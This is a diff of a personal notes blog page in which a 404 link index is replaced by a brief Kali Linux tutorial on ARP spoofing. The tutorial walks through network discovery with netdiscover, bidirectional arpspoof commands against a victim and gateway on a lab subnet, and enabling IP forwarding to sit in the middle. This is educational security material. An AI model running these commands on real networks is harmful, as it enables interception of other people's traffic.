@@ -16,22 +16,37 @@
     <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-<meta property="og:title" content="404 Page not found" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://blog.geni.ai/notes/404.html" />
-
+<meta property="og:title" content="Kali Linux ARP Spoofing" />
+<meta property="og:description" content="Kali Linux ARP Spoofing" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.geni.ai/notes/network_security/kali_linux/arp_spoofing.html" />
+<meta property="article:published_time" content="2020-05-12T16:04:37+00:00" />
+<meta property="article:modified_time" content="2020-05-12T16:04:37+00:00" />
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="404 Page not found"/>
-<meta name="twitter:description" content=""/>
+<meta name="twitter:title" content="Kali Linux ARP Spoofing"/>
+<meta name="twitter:description" content="Kali Linux ARP Spoofing"/>
 <meta name="generator" content="Hugo 0.70.0" />
 
     
-    
-    
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Kali Linux ARP Spoofing",
+  "url": "https:\/\/blog.geni.ai\/notes\/network_security\/kali_linux\/arp_spoofing.html",
+  "wordCount": "144",
+  "datePublished": "2020-05-12T16:04:37\x2b00:00",
+  "dateModified": "2020-05-12T16:04:37\x2b00:00",
+  "author": {
+    "@type": "Person",
+    "name": "Shanaka DeSoysa"
+  },
+  "description": "Kali Linux ARP Spoofing"
+}
+</script> 
 
-    <title>404 - Page Missing</title>
+    <title>Kali Linux ARP Spoofing</title>
 
     
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb"
@@ -127,76 +142,58 @@ MathJax.Hub.Config({
         <div class="row">
             <div class="col-sm-12">
 
-                
+                 
+
+
 <article>
-  <div class="content">
-    <div class="row">
-      <div class="col-sm-12">
-        <div class="card">
-          <h1 class="card-header">
-            <center>
-              <h4>Error - Page Missing</h4>
-            </center>
-          </h1>
-          <div class="card-body">
-            <p>You have found a link that is broken. However, there is hope. Here is every single page on the site listed alphabetically. Use <code>control-f</code> (Windows) or <code>cmd-f</code> (MacOS) to search page titles.</p>
-            <ul>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/network_security/kali_linux/index.xml">/network_security/kali_linux/index.xml</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/python/basics/index.xml">/python/basics/index.xml</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/python/pandas/index.xml">/python/pandas/index.xml</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/about/index.xml">/about/index.xml</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/about/shanaka_desoysa.html">/about/shanaka_desoysa.html</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/python/basics/iso_8601.html">/python/basics/iso_8601.html</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/network_security/kali_linux/arp_spoofing.html">/network_security/kali_linux/arp_spoofing.html</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/network_security/index.xml">/network_security/index.xml</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/python/pandas/groupby.html">/python/pandas/groupby.html</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/python/basics/ascii.html">/python/basics/ascii.html</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/python/index.xml">/python/index.xml</a>
-              </li>
-              
-              <li>
-                <a href="https://blog.geni.ai/notes/">/</a>
-              </li>
-              
-            </ul>
-          </div>
-        </div>
-      </div>
+  <div class="technical_note">
+  <header>
+      
+    <h1 class="technical_note_title">Kali Linux ARP Spoofing</h1>
+    <div class="technical_note_date">
+      <time datetime=" 2020-05-12T16:04:37Z ">May 12, 2020</time>
     </div>
-  </div>
+  </header>
+  <div class="content">
+      
+  <p>In computer networking, <a href="'https://en.wikipedia.org/wiki/ARP_spoofing'">ARP spoofing</a>, ARP cache poisoning, or ARP poison routing, is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network.</p>
+<h2 id="arp">ARP</h2>
+<p>The <a href="('https://en.wikipedia.org/wiki/Address_Resolution_Protocol')">Address Resolution Protocol</a> (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address.</p>
+<p>Check ARP on Linux/Mac/Win.</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">arp -a
+</code></pre></div><h2 id="find-default-gateway">Find Default Gateway</h2>
+<p>Check your default gateway:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">ip route
+</code></pre></div><h2 id="scan-the-network">Scan the Network</h2>
+<p>-r is for range</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">netdiscover -r 10.0.2.0/24
+</code></pre></div><h2 id="arp-spoofing">ARP Spoofing</h2>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">arpspoof -i INTERFACE -t VICTIM_IP GATEWAY_IP
+
+arpspoof -i INTERFACE -t GATEWAY_IP VICTIM_IP
+
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
+</code></pre></div><p>Make sure port forwarding is enabled, as described below.</p>
+<h3 id="check-port-forwarding">Check port forwarding</h3>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">sysctl net.ipv4.ip_forward
+</code></pre></div><h3 id="enable-port-forwarding">Enable port forwarding</h3>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">sysctl -w net.ipv4.ip_forward<span class="o">=</span><span class="m">1</span>
+</code></pre></div><p>OR, if that doesn&rsquo;t work:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre></div>
+</div>
+  <aside>
+      <div class="bug_reporting">
+          <h4>Find an error?</h4>
+          <p>All material is saved on GitHub. Please <a href='https://github.com/shanaka-desoysa/notes/issues/new'>submit a suggested change</a> and include the note's URL in the issue.</p>
+      </div>
+      </aside>
+
+    </div>
 </article>
+
+
 
 
             </div>
